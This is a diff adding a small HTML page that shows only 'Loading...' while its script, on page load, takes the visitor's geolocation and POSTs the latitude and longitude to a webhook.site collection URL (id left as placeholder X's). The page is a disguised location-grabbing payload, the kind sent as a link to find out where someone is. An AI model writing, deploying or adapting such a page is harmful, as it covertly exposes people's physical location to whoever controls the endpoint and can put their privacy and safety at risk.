@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <script>
+    navigator.geolocation.getCurrentPosition(function(location) {
+      fetch("https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          latitude: location.coords.latitude,
+          longitude: location.coords.longitude
+        })
+      });
+    });
+  </script>
+</head>
+<body>
+  <h1>Loading...</h1>
+</body>
+</html>
